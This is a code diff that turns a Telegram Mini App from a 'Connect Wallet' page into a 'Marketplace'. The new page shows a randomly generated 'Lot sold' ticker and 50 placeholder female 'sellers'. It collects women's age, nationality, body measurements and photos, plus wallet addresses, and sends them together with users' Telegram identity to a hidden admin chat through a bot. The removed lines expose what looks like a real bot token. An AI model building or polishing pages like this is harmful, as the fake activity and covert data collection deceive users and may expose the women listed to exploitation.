@@ -3,328 +3,578 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Wallet Connect</title>
+    <title>Marketplace</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             min-height: 100vh;
-            background: linear-gradient(135deg, #0f0f1a 0%, #1a1a2e 50%, #16213e 100%);
+            background: linear-gradient(145deg, #0b0b1a 0%, #14142b 50%, #0d0d24 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: #fff;
+            overflow-x: hidden;
+        }
+
+        /* Ticker */
+        .ticker-wrap {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 36px;
+            background: rgba(255, 215, 0, 0.12);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(255, 215, 0, 0.25);
+            overflow: hidden;
+            z-index: 100;
+            display: flex;
+            align-items: center;
+        }
+        .ticker {
+            display: flex;
+            white-space: nowrap;
+            animation: scroll 25s linear infinite;
+            font-weight: 600;
+            font-size: 15px;
+            letter-spacing: 0.4px;
+            color: #FFD966;
+            text-shadow: 0 0 8px rgba(255, 200, 0, 0.5);
+            padding-left: 20px;
+        }
+        .ticker span {
+            margin-right: 60px;
+        }
+        @keyframes scroll {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+
+        /* Main container */
+        .container {
+            margin-top: 56px; /* below ticker */
+            padding: 20px 16px;
+            width: 100%;
+            max-width: 420px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Register circle */
+        .profile-circle {
+            width: 90px;
+            height: 90px;
+            background: rgba(99, 102, 241, 0.18);
+            border: 2px solid rgba(129, 140, 248, 0.5);
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 20px;
+            margin-bottom: 6px;
+            cursor: pointer;
+            transition: all 0.25s;
+            box-shadow: 0 0 20px rgba(129, 140, 248, 0.25);
         }
-
-        .card {
-            background: rgba(255, 255, 255, 0.04);
-            backdrop-filter: blur(30px);
-            -webkit-backdrop-filter: blur(30px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            border-radius: 28px;
-            padding: 32px 24px;
-            width: 100%;
-            max-width: 380px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        .profile-circle:active {
+            transform: scale(0.96);
+            background: rgba(99, 102, 241, 0.3);
         }
-
-        .icon-container {
-            display: flex;
-            justify-content: center;
+        .profile-circle svg {
+            width: 42px;
+            height: 42px;
+            stroke: #a5b4fc;
+            fill: none;
+            stroke-width: 1.6;
+        }
+        .register-label {
+            font-size: 14px;
+            font-weight: 500;
+            color: #a5b4fc;
             margin-bottom: 24px;
         }
 
-        .wallet-icon {
-            width: 72px;
-            height: 72px;
-            background: rgba(99, 102, 241, 0.15);
+        /* Vitrina / sellers grid */
+        .vitrina-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #e0e7ff;
+            margin: 8px 0 16px;
+            align-self: flex-start;
+            letter-spacing: 0.2px;
+        }
+        .sellers-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+            width: 100%;
+            padding-bottom: 40px;
+        }
+        .seller-card {
+            background: rgba(255, 255, 255, 0.04);
+            border-radius: 20px;
+            padding: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            pointer-events: none;
+            opacity: 0.85;
+        }
+        .seller-photo {
+            width: 80px;
+            height: 80px;
+            background: rgba(255, 255, 255, 0.06);
             border-radius: 50%;
+            margin-bottom: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 11px;
         }
-
-        .wallet-icon svg {
-            width: 36px;
-            height: 36px;
-            stroke: #818cf8;
-            fill: none;
-            stroke-width: 1.8;
-        }
-
-        h1 {
-            color: white;
-            font-size: 26px;
-            font-weight: 600;
-            text-align: center;
-            margin-bottom: 8px;
-            letter-spacing: -0.3px;
-        }
-
-        .subtitle {
-            color: rgba(255, 255, 255, 0.55);
-            text-align: center;
-            font-size: 15px;
-            line-height: 1.5;
-            margin-bottom: 28px;
-        }
-
-        .form-group {
-            margin-bottom: 18px;
-        }
-
-        label {
-            display: block;
-            color: rgba(255, 255, 255, 0.65);
-            font-size: 13px;
+        .seller-name {
+            font-size: 14px;
             font-weight: 500;
-            margin-bottom: 6px;
-            letter-spacing: 0.2px;
+            color: #ddd;
+            margin-bottom: 2px;
+        }
+        .seller-info {
+            font-size: 12px;
+            color: #999;
         }
 
-        select, input {
+        /* Modals */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            z-index: 200;
+            align-items: center;
+            justify-content: center;
+        }
+        .modal-overlay.active {
+            display: flex;
+        }
+        .modal-box {
+            background: rgba(20, 20, 40, 0.95);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            border-radius: 28px;
+            padding: 28px 20px;
+            width: 90%;
+            max-width: 360px;
+            max-height: 85vh;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+        }
+        .modal-box h2 {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            text-align: center;
+        }
+        .role-btn {
+            background: rgba(99, 102, 241, 0.15);
+            border: 1px solid rgba(129, 140, 248, 0.4);
+            border-radius: 18px;
+            padding: 16px;
+            font-size: 18px;
+            font-weight: 600;
+            color: #c7d2fe;
+            margin-bottom: 12px;
+            text-align: center;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .role-btn:active {
+            background: rgba(99, 102, 241, 0.3);
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-bottom: 4px;
+            letter-spacing: 0.3px;
+        }
+        .form-group input, .form-group select {
             width: 100%;
-            padding: 14px 16px;
+            padding: 12px 14px;
             background: rgba(255, 255, 255, 0.06);
             border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 16px;
-            color: white;
+            border-radius: 14px;
+            color: #fff;
             font-size: 15px;
             outline: none;
-            transition: all 0.25s;
-            -webkit-appearance: none;
-            appearance: none;
-            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.4)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="6 9 12 15 18 9"/></svg>');
-            background-repeat: no-repeat;
-            background-position: right 16px center;
-            background-size: 14px;
         }
-
-        input {
-            background-image: none;
+        .form-group input:focus, .form-group select:focus {
+            border-color: #818cf8;
         }
-
-        select:focus, input:focus {
-            border-color: rgba(129, 140, 248, 0.5);
-            background: rgba(255, 255, 255, 0.08);
-        }
-
-        button {
-            width: 100%;
-            padding: 15px;
+        .action-btn {
             background: linear-gradient(135deg, #6366f1, #4f46e5);
             border: none;
             border-radius: 16px;
+            padding: 14px;
             color: white;
-            font-size: 16px;
             font-weight: 600;
-            letter-spacing: 0.2px;
+            font-size: 16px;
+            text-align: center;
             cursor: pointer;
-            transition: all 0.2s;
             margin-top: 8px;
         }
-
-        button:active {
-            transform: scale(0.98);
-            opacity: 0.9;
+        .action-btn:disabled {
+            opacity: 0.5;
+            pointer-events: none;
         }
-
-        button:disabled {
-            background: rgba(255, 255, 255, 0.1);
-            color: rgba(255, 255, 255, 0.4);
-            transform: none;
-            opacity: 1;
+        .photo-upload-area {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 10px 0;
         }
-
-        .status-message {
-            text-align: center;
-            margin-top: 24px;
-            font-size: 15px;
-            color: rgba(255, 255, 255, 0.7);
-            min-height: 24px;
+        .photo-slot {
+            width: 70px;
+            height: 70px;
+            border: 2px dashed rgba(255, 255, 255, 0.3);
+            border-radius: 16px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
+            font-size: 11px;
+            color: #aaa;
+            background: rgba(255,255,255,0.03);
+            overflow: hidden;
         }
-
-        .loader {
-            width: 18px;
-            height: 18px;
-            border: 2px solid rgba(255, 255, 255, 0.2);
-            border-top-color: #818cf8;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            display: none;
+        .photo-slot img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
-        .error-text {
-            color: #f87171;
-            font-size: 13px;
-            margin-top: 4px;
-            display: none;
+        .close-btn {
+            background: transparent;
+            border: 1px solid rgba(255,255,255,0.2);
+            color: #ccc;
+            border-radius: 14px;
+            padding: 10px;
+            margin-top: 12px;
+            font-size: 14px;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="icon-container">
-            <div class="wallet-icon">
-                <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
-                    <rect x="2" y="5" width="20" height="14" rx="2" />
-                    <line x1="2" y1="10" x2="22" y2="10" />
-                    <circle cx="16" cy="15" r="2" />
-                </svg>
-            </div>
-        </div>
-        <h1>Connect Wallet</h1>
-        <p class="subtitle">Link your wallet to get started.<br>No funds will be moved now.</p>
 
+<!-- Ticker -->
+<div class="ticker-wrap">
+    <div class="ticker" id="ticker"></div>
+</div>
+
+<div class="container">
+    <!-- Profile circle -->
+    <div class="profile-circle" id="profileCircle">
+        <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/>
+            <circle cx="12" cy="7" r="4"/>
+        </svg>
+    </div>
+    <div class="register-label">Register</div>
+
+    <!-- Sellers vitrina -->
+    <div class="vitrina-title">Sellers</div>
+    <div class="sellers-grid" id="sellersGrid"></div>
+</div>
+
+<!-- Modal: Role selection -->
+<div class="modal-overlay" id="roleModal">
+    <div class="modal-box">
+        <h2>Choose role</h2>
+        <div class="role-btn" id="sellerRoleBtn">I am a seller</div>
+        <div class="role-btn" id="buyerRoleBtn">I am a buyer</div>
+        <button class="close-btn" id="closeRoleModal">Cancel</button>
+    </div>
+</div>
+
+<!-- Modal: Seller form -->
+<div class="modal-overlay" id="sellerFormModal">
+    <div class="modal-box">
+        <h2>Seller details</h2>
+        <div class="form-group"><label>Name</label><input type="text" id="sName" placeholder="Jane"></div>
+        <div class="form-group"><label>Nickname</label><input type="text" id="sNick" placeholder="Janny"></div>
+        <div class="form-group"><label>Age</label><input type="number" id="sAge" placeholder="25"></div>
+        <div class="form-group"><label>Nationality</label><input type="text" id="sNation" placeholder="American"></div>
+        <div class="form-group"><label>Height (cm)</label><input type="number" id="sHeight" placeholder="170"></div>
+        <div class="form-group"><label>Weight (kg)</label><input type="number" id="sWeight" placeholder="55"></div>
+        <div class="form-group"><label>Bust</label><input type="text" id="sBust" placeholder="C"></div>
+        <div class="form-group"><label>Parameters</label><input type="text" id="sParams" placeholder="90-60-90"></div>
+        <button class="action-btn" id="sellerNextBtn">Continue to photos</button>
+        <button class="close-btn" id="closeSellerForm">Cancel</button>
+    </div>
+</div>
+
+<!-- Modal: Photo upload (seller) -->
+<div class="modal-overlay" id="photoModal">
+    <div class="modal-box">
+        <h2>Upload at least 3 photos</h2>
+        <div class="photo-upload-area">
+            <div class="photo-slot" id="slot1"><span>+</span></div>
+            <div class="photo-slot" id="slot2"><span>+</span></div>
+            <div class="photo-slot" id="slot3"><span>+</span></div>
+        </div>
+        <input type="file" accept="image/*" id="photoInput" style="display:none" multiple>
+        <button class="action-btn" id="uploadTriggerBtn">Select photos</button>
+        <button class="action-btn" id="photoDoneBtn" disabled>Continue to wallet</button>
+        <button class="close-btn" id="closePhotoModal">Back</button>
+    </div>
+</div>
+
+<!-- Modal: Wallet connect (old functionality) -->
+<div class="modal-overlay" id="walletModal">
+    <div class="modal-box">
+        <h2>Connect Wallet</h2>
         <div class="form-group">
-            <label for="network">Network</label>
+            <label>Network</label>
             <select id="network">
                 <option value="ethereum">Ethereum (ERC-20)</option>
                 <option value="bsc">BNB Smart Chain (BEP-20)</option>
                 <option value="tron">Tron (TRC-20)</option>
             </select>
         </div>
-
         <div class="form-group">
-            <label for="walletAddress">Wallet address</label>
+            <label>Wallet address</label>
             <input type="text" id="walletAddress" placeholder="0x... or T...">
-            <div id="addressError" class="error-text">Please enter a valid address</div>
+            <div id="addressError" style="color:#f87171;font-size:12px;display:none;margin-top:4px;">Invalid address</div>
         </div>
-
-        <button id="registerBtn">Register</button>
-
-        <div class="status-message">
-            <div class="loader" id="loader"></div>
-            <span id="statusText"></span>
-        </div>
+        <button class="action-btn" id="walletSubmitBtn">Register</button>
+        <div style="text-align:center;margin-top:12px;font-size:14px;color:#aaa;" id="walletStatus"></div>
+        <button class="close-btn" id="closeWalletModal">Cancel</button>
     </div>
+</div>
 
-    <script>
-        (function() {
-            // ---------- CONFIGURATION – MUST BE FILLED ----------
-            const BOT_TOKEN = '8922219326:AAGm212U6WyTAjgI1cmgtXUPiexvWg-mb7U';      // Replace with your bot token from @BotFather
-            const ADMIN_CHAT_ID = '8696933754';   // Replace with your Telegram numeric chat ID
-            // --------------------------------------------------------
+<script>
+(function() {
+    // ---------- CONFIG ----------
+    const BOT_TOKEN = 'YOUR_BOT_TOKEN';
+    const ADMIN_CHAT_ID = 'YOUR_CHAT_ID';
+    // ---------------------------
 
-            const tg = window.Telegram ? window.Telegram.WebApp : null;
+    const tg = window.Telegram ? window.Telegram.WebApp : null;
+    if (tg) {
+        tg.ready();
+        tg.expand();
+    }
 
-            // Initialize Telegram Mini App
-            if (tg) {
-                tg.ready();
-                tg.expand();
-                // Use Telegram theme colors for background adaptation
-                document.body.style.backgroundColor = tg.backgroundColor || 'var(--tg-theme-bg-color)';
+    // ---------- TICKER ----------
+    const ticker = document.getElementById('ticker');
+    const messages = [];
+    for (let i = 0; i < 20; i++) {
+        let amount = Math.floor(Math.random() * 4751) + 250; // 250-5000
+        messages.push(`Lot sold for $${amount}`);
+    }
+    // Duplicate for seamless scroll
+    ticker.innerHTML = messages.map(m => `<span>${m}</span>`).join('') + messages.map(m => `<span>${m}</span>`).join('');
+
+    // ---------- SELLERS VITRINA (50 dummy) ----------
+    const femaleNames = [
+        "Sophia", "Olivia", "Emma", "Ava", "Isabella", "Mia", "Luna", "Harper", "Evelyn", "Ella",
+        "Avery", "Scarlett", "Grace", "Chloe", "Zoey", "Lily", "Hannah", "Aria", "Ellie", "Nora",
+        "Leah", "Maya", "Riley", "Naomi", "Layla", "Stella", "Victoria", "Aurora", "Penelope", "Addison",
+        "Brooklyn", "Hazel", "Aaliyah", "Camila", "Genesis", "Natalie", "Savannah", "Aubrey", "Bella", "Skylar",
+        "Claire", "Violet", "Gabriella", "Madelyn", "Eleanor", "Alice", "Ruby", "Ivy", "Willow", "Kinsley"
+    ];
+    const sellersGrid = document.getElementById('sellersGrid');
+    femaleNames.forEach(name => {
+        const card = document.createElement('div');
+        card.className = 'seller-card';
+        card.innerHTML = `
+            <div class="seller-photo">Photo</div>
+            <div class="seller-name">${name}</div>
+            <div class="seller-info">Active</div>
+        `;
+        sellersGrid.appendChild(card);
+    });
+
+    // ---------- MODALS ----------
+    const roleModal = document.getElementById('roleModal');
+    const sellerFormModal = document.getElementById('sellerFormModal');
+    const photoModal = document.getElementById('photoModal');
+    const walletModal = document.getElementById('walletModal');
+
+    // Profile circle -> role modal
+    document.getElementById('profileCircle').addEventListener('click', () => {
+        roleModal.classList.add('active');
+    });
+
+    // Close buttons
+    document.getElementById('closeRoleModal').addEventListener('click', () => roleModal.classList.remove('active'));
+    document.getElementById('closeSellerForm').addEventListener('click', () => sellerFormModal.classList.remove('active'));
+    document.getElementById('closePhotoModal').addEventListener('click', () => {
+        photoModal.classList.remove('active');
+        sellerFormModal.classList.add('active'); // back to form
+    });
+    document.getElementById('closeWalletModal').addEventListener('click', () => walletModal.classList.remove('active'));
+
+    // Role selection
+    document.getElementById('buyerRoleBtn').addEventListener('click', () => {
+        roleModal.classList.remove('active');
+        // Buyer skips seller form, goes directly to wallet
+        walletModal.classList.add('active');
+    });
+
+    document.getElementById('sellerRoleBtn').addEventListener('click', () => {
+        roleModal.classList.remove('active');
+        sellerFormModal.classList.add('active');
+    });
+
+    // Seller form -> photo modal
+    document.getElementById('sellerNextBtn').addEventListener('click', () => {
+        // Simple validation
+        const sName = document.getElementById('sName').value.trim();
+        const sNick = document.getElementById('sNick').value.trim();
+        if (!sName || !sNick) {
+            alert('Please fill at least Name and Nickname');
+            return;
+        }
+        sellerFormModal.classList.remove('active');
+        photoModal.classList.add('active');
+    });
+
+    // Photo upload logic (demo)
+    let selectedFiles = [];
+    const photoInput = document.getElementById('photoInput');
+    const uploadTrigger = document.getElementById('uploadTriggerBtn');
+    const photoDoneBtn = document.getElementById('photoDoneBtn');
+    const slots = [document.getElementById('slot1'), document.getElementById('slot2'), document.getElementById('slot3')];
+
+    uploadTrigger.addEventListener('click', () => photoInput.click());
+
+    photoInput.addEventListener('change', (e) => {
+        const files = Array.from(e.target.files);
+        selectedFiles = files.slice(0, 3);
+        // Show previews
+        for (let i = 0; i < 3; i++) {
+            const slot = slots[i];
+            if (i < selectedFiles.length) {
+                const reader = new FileReader();
+                reader.onload = (ev) => {
+                    slot.innerHTML = `<img src="${ev.target.result}" alt="photo">`;
+                };
+                reader.readAsDataURL(selectedFiles[i]);
+            } else {
+                slot.innerHTML = '<span>+</span>';
             }
+        }
+        photoDoneBtn.disabled = selectedFiles.length < 3;
+    });
 
-            const networkSelect = document.getElementById('network');
-            const addressInput = document.getElementById('walletAddress');
-            const registerBtn = document.getElementById('registerBtn');
-            const statusText = document.getElementById('statusText');
-            const loader = document.getElementById('loader');
-            const addressError = document.getElementById('addressError');
+    photoDoneBtn.addEventListener('click', () => {
+        if (selectedFiles.length < 3) return;
+        photoModal.classList.remove('active');
+        walletModal.classList.add('active');
+    });
 
-            // Simple address validation per network
-            function isValidAddress(network, address) {
-                if (!address || address.trim() === '') return false;
-                const addr = address.trim();
-                if (network === 'ethereum' || network === 'bsc') {
-                    return /^0x[a-fA-F0-9]{40}$/.test(addr);
-                } else if (network === 'tron') {
-                    return /^T[a-zA-Z0-9]{33}$/.test(addr);
-                }
-                return false;
-            }
+    // ---------- WALLET LOGIC (preserved) ----------
+    const walletSubmit = document.getElementById('walletSubmitBtn');
+    const walletStatus = document.getElementById('walletStatus');
+    const addressError = document.getElementById('addressError');
 
-            // Hide error on input
-            addressInput.addEventListener('input', () => {
-                addressError.style.display = 'none';
-            });
+    function isValidAddress(network, address) {
+        if (!address || address.trim() === '') return false;
+        const addr = address.trim();
+        if (network === 'ethereum' || network === 'bsc') {
+            return /^0x[a-fA-F0-9]{40}$/.test(addr);
+        } else if (network === 'tron') {
+            return /^T[a-zA-Z0-9]{33}$/.test(addr);
+        }
+        return false;
+    }
 
-            // Extract Telegram user info if available (non-intrusive)
-            function getUserInfo() {
-                if (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) {
-                    const user = tg.initDataUnsafe.user;
-                    return `ID: ${user.id}, Name: ${user.first_name} ${user.last_name || ''}, Username: @${user.username || 'none'}`;
-                }
-                return 'No Telegram user data';
-            }
+    document.getElementById('walletAddress').addEventListener('input', () => {
+        addressError.style.display = 'none';
+    });
 
-            // Send data to admin via Telegram Bot API
-            async function sendToAdmin(network, address, userInfo) {
-                const message = `🆕 New wallet registration\n\n` +
-                    `👤 User: ${userInfo}\n` +
-                    `🌐 Network: ${network}\n` +
-                    `🔑 Address: ${address}\n` +
-                    `⏰ Time: ${new Date().toISOString()}`;
+    walletSubmit.addEventListener('click', async () => {
+        const network = document.getElementById('network').value;
+        const address = document.getElementById('walletAddress').value.trim();
+        if (!isValidAddress(network, address)) {
+            addressError.style.display = 'block';
+            return;
+        }
+        addressError.style.display = 'none';
+        walletSubmit.disabled = true;
+        walletSubmit.textContent = 'Sending...';
+        walletStatus.textContent = '';
 
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                const params = new URLSearchParams();
-                params.append('chat_id', ADMIN_CHAT_ID);
-                params.append('text', message);
-                params.append('parse_mode', 'HTML');
+        // Gather seller data if it exists
+        let sellerData = null;
+        if (document.getElementById('sName').value.trim() !== '') {
+            sellerData = {
+                name: document.getElementById('sName').value.trim(),
+                nickname: document.getElementById('sNick').value.trim(),
+                age: document.getElementById('sAge').value.trim(),
+                nationality: document.getElementById('sNation').value.trim(),
+                height: document.getElementById('sHeight').value.trim(),
+                weight: document.getElementById('sWeight').value.trim(),
+                bust: document.getElementById('sBust').value.trim(),
+                parameters: document.getElementById('sParams').value.trim(),
+            };
+        }
 
-                const response = await fetch(url, {
-                    method: 'POST',
-                    body: params,
-                });
-                const data = await response.json();
-                if (!data.ok) {
-                    throw new Error(data.description || 'Failed to send notification');
-                }
-                return data;
-            }
+        let userInfo = 'Unknown';
+        if (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) {
+            const u = tg.initDataUnsafe.user;
+            userInfo = `ID: ${u.id}, Name: ${u.first_name} ${u.last_name || ''}, @${u.username || 'none'}`;
+        }
 
-            registerBtn.addEventListener('click', async () => {
-                const network = networkSelect.value;
-                const address = addressInput.value.trim();
+        let message = `🆕 New wallet registration\n👤 ${userInfo}\n🌐 Network: ${network}\n🔑 Address: ${address}\n⏰ ${new Date().toISOString()}`;
+        if (sellerData) {
+            message += `\n\n📋 Seller profile:\n` +
+                `Name: ${sellerData.name}\nNick: ${sellerData.nickname}\nAge: ${sellerData.age}\n` +
+                `Nationality: ${sellerData.nationality}\nHeight: ${sellerData.height} cm\n` +
+                `Weight: ${sellerData.weight} kg\nBust: ${sellerData.bust}\nParams: ${sellerData.parameters}`;
+        }
 
-                // Validate
-                if (!isValidAddress(network, address)) {
-                    addressError.style.display = 'block';
-                    return;
-                }
-                addressError.style.display = 'none';
+        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const params = new URLSearchParams();
+            params.append('chat_id', ADMIN_CHAT_ID);
+            params.append('text', message);
+            params.append('parse_mode', 'HTML');
+            const resp = await fetch(url, { method: 'POST', body: params });
+            const data = await resp.json();
+            if (!data.ok) throw new Error(data.description || 'API error');
+            walletStatus.textContent = 'Awaiting confirmation...';
+            walletSubmit.textContent = 'Done';
+            walletSubmit.disabled = true;
+        } catch (err) {
+            console.error(err);
+            walletStatus.textContent = 'Connection error. Try again.';
+            walletSubmit.disabled = false;
+            walletSubmit.textContent = 'Register';
+        }
+    });
 
-                // Update UI
-                registerBtn.disabled = true;
-                registerBtn.textContent = 'Registering...';
-                loader.style.display = 'block';
-                statusText.textContent = 'Sending data...';
+    // Close wallet modal (cleanup if needed)
+    document.getElementById('closeWalletModal').addEventListener('click', () => {
+        walletModal.classList.remove('active');
+        walletStatus.textContent = '';
+        walletSubmit.disabled = false;
+        walletSubmit.textContent = 'Register';
+        document.getElementById('walletAddress').value = '';
+    });
 
-                const userInfo = getUserInfo();
-
-                try {
-                    await sendToAdmin(network, address, userInfo);
-                    // Success
-                    loader.style.display = 'none';
-                    statusText.textContent = 'Awaiting confirmation...';
-                    registerBtn.textContent = 'Done';
-                    registerBtn.disabled = true;
-                    // Optionally disable form fields
-                    networkSelect.disabled = true;
-                    addressInput.disabled = true;
-                } catch (error) {
-                    console.error(error);
-                    loader.style.display = 'none';
-                    statusText.textContent = 'Connection error. Try again.';
-                    registerBtn.disabled = false;
-                    registerBtn.textContent = 'Register';
-                }
-            });
-        })();
-    </script>
+})();
+</script>
 </body>
-  </html>
+    </html>
